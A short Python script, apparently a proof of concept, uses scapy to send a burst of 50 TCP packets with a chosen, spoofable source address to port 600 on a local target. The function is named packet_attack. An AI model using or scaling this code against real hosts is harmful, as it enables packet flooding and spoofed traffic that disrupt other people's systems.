from scapy.all import IP,TCP,send

# POC packet blast 
def packet_attack(source, target):
    for source_port in range(100, 150):
        ip_layer = IP(src=source, dst=target)
        tcp_layer = TCP(sport=source_port, dport=600)

        packet = ip_layer/tcp_layer
        send(packet)

packet_attack('127.0.0.1', '0.0.0.0')